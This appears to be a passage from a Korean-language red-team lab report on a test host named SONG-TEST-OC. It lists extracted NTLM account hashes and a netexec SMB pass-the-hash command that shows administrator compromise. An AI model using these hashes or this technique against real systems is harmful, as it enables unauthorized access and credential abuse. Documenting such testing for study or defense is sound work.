...
> **호스트명**: `SONG-TEST-OC` / `172.16.157.187`  
> **공격자 (Kali)**: `172.16.157.177` · **C2 서버**: `172.16.140.6`  
...
**실제 추출된 NTLM 해시 (SONG-TEST-OC)**:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Song:1001:...:e6b41a6fceef5aae07b4a38e457721bb:::
mitre:1005:...:b1f4a86e7dafc91ef5afc6acba6a8fba:::
remote:1006:...:296b9ec6af987187e863f62cd6e7604c:::
```
...
```bash
netexec smb <target> -u administrator -H 7facdc498ed1680c4fd1448319a8c04f --local-auth \
  2>&1 | grep -v "Cryptography\|arc4"
# [+] SONG-TEST-OC\administrator:7facdc498... (Pwn3d!) 확인
```
